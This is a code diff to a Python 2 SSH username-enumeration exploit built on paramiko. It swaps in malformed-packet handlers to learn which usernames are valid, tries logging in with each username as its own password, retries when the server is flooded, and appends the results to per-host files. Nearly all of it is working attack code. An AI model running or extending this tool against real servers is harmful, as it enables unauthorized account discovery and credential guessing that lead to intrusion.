@@ -37,8 +37,8 @@ dirName = 'SSHLoginData'
 if not os.path.exists(dirName):
     os.mkdir(dirName)
     print "Directory " , dirName ,  " Created "
-else:    
-    print "Directory " , dirName ,  " already exists"
+# else:    
+    # print "Directory " , dirName ,  " already exists"
 
 # store function we will overwrite to malform the packet
 old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
@@ -95,10 +95,13 @@ def checkUsername(runArray, tried=0):
         
         if args.testcreds:
             out = sshAuth(host,port,username)
+            paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+            paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
             if out == True:
                 print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found and username successfully authenticated."
                 saveFile(username, host, port, out)
             else:
+                print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
                 saveFile(username, host, port, out)
         else:
             print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
@@ -108,7 +111,7 @@ def checkUsername(runArray, tried=0):
     #Successful auth(?)
     raise Exception("There was an error. Is this the correct version of OpenSSH?")
     
-def sshAuth(host,port,username):
+def sshAuth(host,port,username, tried=0):
     try:
         paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = old_parse_service_accept
         paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = old_parse_userauth_failure
@@ -116,14 +119,18 @@ def sshAuth(host,port,username):
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(host, port=port, username=username, password=username, allow_agent=False)
         ssh.close()
-        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
-        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
         return True
-    except paramiko.ssh_exception.AuthenticationException as e:
+    except paramiko.ssh_exception.AuthenticationException:
         # print("Error: " + str(e))
-        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
-        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
         return False
+    except paramiko.ssh_exception.SSHException:
+            # server was likely flooded, retry up to 3 times
+            if tried < 4:
+                tried += 1
+                return sshAuth(host,port,username, tried)
+            else:
+                print '[-] Failed to negotiate SSH transport. Trying next user.' 
+                return False
 
 def saveFile(username, host, port, out):
     outputFile = open("SSHLoginData/" + str(host) + ".txt", "a")
